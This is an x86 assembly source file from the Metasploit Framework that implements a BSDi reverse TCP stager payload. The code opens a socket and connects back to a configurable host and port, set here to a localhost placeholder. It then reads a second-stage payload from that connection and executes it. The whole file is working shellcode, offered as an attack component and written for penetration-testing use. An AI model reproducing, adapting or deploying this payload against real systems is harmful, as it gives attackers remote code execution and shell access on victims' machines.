;;
; 
;        Name: stager_sock_reverse
;   Qualities: Can Have Nulls
;     Version: $Revision: 1633 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a BSDi reverse TCP stager.
;
;        File descriptor in edi.
;
; Meta-Information:
;
; meta-shortname=BSDi Reverse TCP Stager
; meta-description=Connect back to the framework and run a second stage
; meta-authors=skape <mmiller [at] hick.org>, optyx <optyx [at] uberhax0r.net>
; meta-os=bsdi
; meta-arch=ia32
; meta-category=stager
; meta-connection-type=reverse
; meta-name=reverse_tcp
; meta-basemod=Msf::PayloadComponent::ReverseConnection
; meta-offset-lhost=0x1c
; meta-offset-lport=0x23
;;
BITS   32
GLOBAL _start

_start:

initialization:
	mov  ebp, esp
	push 0xc3000700
	mov  eax, 0x9a
	cdq
	push eax
	mov  esi, esp

socket:
	push edx
	inc  edx
	push edx
	inc  edx
	push edx
	push byte 0x61
	pop  eax
	call esi
	xchg eax, edi

connect:
	push dword 0x0100007f
	push dword 0xbfbf0210
	mov  ebx, esp
	push byte 0x10
	push ebx
	push edi
	push byte 0x62
	pop  eax
	call esi

%ifndef USE_SINGLE_STAGE

read:
	mov  al, 0x3
	mov  dh, 0xc
	push edx
	push ebp
	push edi
	call esi
	pop  edi
	ret

%endif
